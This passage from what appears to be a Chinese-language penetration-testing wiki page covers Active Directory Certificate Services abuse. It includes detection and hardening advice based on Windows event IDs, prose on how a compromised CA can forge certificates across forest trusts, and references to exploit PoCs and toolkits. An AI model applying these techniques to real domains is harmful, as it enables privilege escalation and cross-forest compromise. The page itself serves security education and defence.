替换后的 ticket 只能由**同一计算机账户/密钥**（此处为 `HOST` 上的 CIFS）使用。它不是可在其他域计算机上复用的 Administrator ticket。此外，演示的结果是以 Administrator 身份获得特权 SMB/文件系统访问权限；若要获取本地 `NT AUTHORITY\SYSTEM` 进程，仍需单独执行远程执行步骤。<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 检测与加固

- 在 CA 上，关联 Certification Services 事件 **4886**（收到请求）和 **4887**（已颁发），以发现 IIS 服务器账户发出的异常 `Machine` 模板请求。<sup>[[19]](#references)[[24]](#references)</sup>
- 在 DC 上，使用证书 pre-authentication 时，事件 **4768** 会包含证书字段；应对 web 服务器账户发出的异常 PKINIT TGT 请求发出告警。后续还应检查涉及特权 impersonated identity 且来自同一主机的 **4769** 请求。由于 Rubeus `/altservice` 会在客户端重写 KRB-CRED 服务名称，因此不要要求 DC 端的 4769 服务名称必须是 `cifs`。<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- 搜寻 `w3wp.exe` 访问 CA RPC 端点、意外创建的 ASPX 文件、经 Kerberos authentication 访问管理共享，以及 secrets-dumping 活动。尽可能限制应用层对 CA RPC/KDC/SMB 的访问，并移除非运行所必需的计算机注册权限或 machine-authentication templates。<sup>[[19]](#references)</sup>

## 以被动语态说明利用 Certificates Compromise Forests

### 被攻陷的 CA 如何破坏 Forest Trusts

**cross-forest enrollment** 的配置相对简单。资源 forest 的 **root CA certificate** 由管理员**发布到 account forests**，而资源 forest 的 **enterprise CA** certificates 则被**添加到每个 account forest 中的 `NTAuthCertificates` 和 AIA 容器**。需要说明的是，这种安排赋予了资源 forest 中的 **CA 对其管理 PKI 的所有其他 forests 的完全控制权**。如果攻击者**攻陷了该 CA**，他们就可以**伪造资源 forest 和 account forests 中所有用户的 certificates**，从而破坏 forest 的安全边界。<sup>[[6]](#references)</sup>

### 授予 Foreign Principals 的 Enrollment 权限

在多 forest 环境中，对于会**发布 certificate templates** 的 Enterprise CAs，必须谨慎检查这些模板是否允许 **Authenticated Users 或 foreign principals**（属于 Enterprise CA 所在 forest 之外的用户/组）拥有**注册和编辑权限**。\
跨 trust 完成 authentication 后，AD 会将 **Authenticated Users SID** 添加到用户的 token 中。因此，如果某个 domain 拥有 Enterprise CA，且其模板**允许 Authenticated Users 注册**，那么来自另一个 forest 的用户就有可能**注册该模板**。同样，如果某个模板**明确授予 foreign principal 注册权限**，就会由此**建立跨 forest 的访问控制关系**，使一个 forest 中的 principal 能够**注册另一个 forest 中的模板**。

这两种情况都会**扩大 forests 之间的 attack surface**。攻击者可以利用 certificate template 的设置，在 foreign domain 中获得更多权限。<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC 仓库](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost 技术分析](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps 博客](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned：滥用 Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0：ESC9、ESC10、BloodHound GUI、新的 Authentication 和 Request 方法等](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials：滥用 Key Trust Account Mapping 接管账户](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key（误）用法的故事](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – 通过 RPC 中继到 AD Certificate Services](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12：通过 YubiHSM 获取 ADCS CA 的 Shell 访问权限](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 滥用技术](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 滥用技术](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – 权限提升（ESC1-ESC17）](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu：不只是另一种 AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16：错误配置与利用](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – 重新审视“Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – 通过 AD CS RPC Endpoint 从 IIS AppPool 提权](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 命令](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – 审核 Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – 事件 4768：请求 Kerberos authentication ticket](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – 事件 4769：请求 Kerberos service ticket](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
